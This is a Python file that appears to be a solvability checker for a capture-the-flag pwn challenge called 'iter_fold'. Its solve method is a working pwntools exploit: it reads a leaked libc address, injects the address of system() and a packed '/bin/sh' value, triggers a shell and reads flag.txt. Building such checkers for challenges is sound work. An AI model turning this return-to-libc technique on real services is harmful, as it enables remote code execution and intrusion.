from pwn import *

from inspectors.pwn import PwnChallengeInspector


class IterFoldInspector(PwnChallengeInspector):

    def solve(self) -> bool:
        context.log_level = 'CRITICAL'
        libc = ELF('distfiles/iter_fold/libc-2.27.so', checksec=False)

        io = remote(self.host, self.port)  # solvabilityの確認が発生するときはconnectaleなことが保証されているためtry-except句の外にあって大丈夫
        try:
            system_offset = libc.symbols['system']
            bin_sh = int(b"/bin/sh"[::-1].hex(), 16)
            libc_base_addr = int(io.recvline().split()[0], 16)

            mal_array = [0] * 4 + [libc_base_addr + system_offset]
            for v in mal_array:
                io.recvregex(r'array\[\d\] =')
                io.sendline(str(v))

            io.recvuntil('init =')
            io.sendline(str(bin_sh))

            io.recvline()  # operartor please(+,-,*,/)
            io.sendline(chr(ord('*') - 1))
            io.recvline()  # vec![{{elements}}].iter().fold({{init}}, |ans, &x| ans {{op}} x);

            io.sendline('cat flag.txt')

            res = io.recvline().decode()
            assert res.strip() == self.flag, res
            self.logger.info(self.msg_succeeded_to_solve())
            return True
        except Exception:
            self.logger.warning(self.msg_failed_to_solve())
            return False
        finally:
            io.close()
